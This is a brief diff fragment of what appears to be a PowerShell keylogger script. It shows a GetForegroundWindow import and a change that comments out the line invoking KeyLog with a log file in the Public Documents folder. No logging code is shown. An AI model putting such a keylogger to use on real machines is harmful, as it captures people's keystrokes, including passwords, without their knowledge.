@@ -106,4 +106,4 @@ public static extern int GetForegroundWindow();
     }
 }
 
-KeyLog -logfile "c:\Users\Public\Documents\log.txt"
+# KeyLog -logfile "c:\Users\Public\Documents\log.txt"
